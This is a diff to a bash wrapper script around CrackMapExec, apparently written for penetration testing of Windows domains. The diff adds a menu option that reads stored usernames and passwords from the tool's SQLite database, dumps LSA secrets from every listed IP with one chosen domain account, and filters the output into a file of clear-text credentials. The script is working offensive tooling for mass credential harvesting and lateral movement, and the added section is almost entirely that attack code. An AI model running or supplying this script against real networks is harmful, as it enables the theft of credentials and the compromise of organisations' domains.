@@ -19,7 +19,7 @@ echo "If your system has the default cme configuration, you can perform a"
 echo "find/replace on this file for Successful_Admin_Access/Pwn3d!"
 echo " "
 
-options=("Check all Domain Accounts in cmedb" "Check all Local-auth Accounts in cmedb" "Check all Domain and Local-auth Accounts (ALL)" "Check single creds ID # (ONLY USE DOMAIN ACCOUNTS)" "Gather LSA Clear-text from all IPs using all Domain and Local-auth Accounts (LSA-ALL)" "Gather DCC2 Hashes from all IPs using all Domain and Local-auth Accounts (DCC2-ALL)" "Display LSA Clear-text of All Previously Gathered" "Display DCC2 Hashes of All Previously Gathered" "Spider file contents for DA account IDs in provided txt file" "Spider filenames for common network configs" "Spider specific pattern for filename search" "Quit")
+options=("Check all Domain Accounts in cmedb" "Check all Local-auth Accounts in cmedb" "Check all Domain and Local-auth Accounts (ALL)" "Check single creds ID # (ONLY USE DOMAIN ACCOUNTS)" "Gather LSA Clear-text from all IPs using single creds ID # (ONLY USE DOMAIN ACCOUNTS)" "Gather LSA Clear-text from all IPs using all Domain and Local-auth Accounts (LSA-ALL)" "Gather DCC2 Hashes from all IPs using all Domain and Local-auth Accounts (DCC2-ALL)" "Display LSA Clear-text of All Previously Gathered" "Display DCC2 Hashes of All Previously Gathered" "Spider file contents for DA account IDs in provided txt file" "Spider filenames for common network configs" "Spider specific pattern for filename search" "Quit")
 
 read -p "Enter DOMAIN name exactly as it is in the cmedb (case sensitive): " domain
 echo " "
@@ -180,6 +180,39 @@ do
             echo ==========================================================
             echo ============ COMPLETE - See Results Above ================
             echo ==========================================================
+            echo " "
+			break
+			;;
+
+            "Gather LSA Clear-text from all IPs using single creds ID # (ONLY USE DOMAIN ACCOUNTS)")
+			#Pull LSA from all IPs for single domain acct
+            (
+            echo ID# - Username - Password-or-Hash > /tmp/cme-id-$tag.txt
+            for i in $(cat /tmp/cme-domain-accts-$tag.txt )
+            do
+                users1=$(sqlite3 /root/.cme/workspaces/default/smb.db "SELECT id FROM users WHERE id='$i';")
+                users2=$(sqlite3 /root/.cme/workspaces/default/smb.db "SELECT username FROM users WHERE id='$i';")
+                users3=$(sqlite3 /root/.cme/workspaces/default/smb.db "SELECT password FROM users WHERE id='$i';")
+				echo $users1 - $users2 - $users3 >> /tmp/cme-id-$tag.txt
+            done
+            column -t -s' ' /tmp/cme-id-$tag.txt > /tmp/cme-id2-$tag.txt
+            ) > /dev/null
+            echo " "
+            cat /tmp/cme-id2-$tag.txt
+            echo " "
+			read -p "Enter creds ID # from list above: " id
+            echo " "
+			echo =========== Beginning Checks Now =================
+			echo " "
+			cme -t 30 smb /tmp/cme-ip-$tag.txt -id $id --lsa | tee -a /tmp/cme-creds-check-$tag.txt
+            echo " "
+            cat /root/.cme/logs/*.secrets | grep -a -v 'aad3b435b51404eeaad3b435b51404ee\|RasDialParams\|DPAPI_SYSTEM\|L$_SQSA\|L$kek\|aes256-cts-hmac\|L$ASP.NET\|aes128-cts-hmac\|des-cbc-md5\|dpapi_machinekey\|dpapi_userkey\|NL$KM:\|L$kek-KeyVault_' | sed -E '/.{64}/d' > /tmp/lsa-clear-raw-$tag.txt
+            sort /tmp/lsa-clear-raw-$tag.txt | uniq > /tmp/lsa-clear-$tag.txt
+            echo " "
+            echo ==========================================================
+            echo =========== All LSA Clear-text Credentials ==============
+            echo ==========================================================
+            echo Results are saved at: /tmp/lsa-clear-$tag.txt
             echo " "
 			break
 			;;
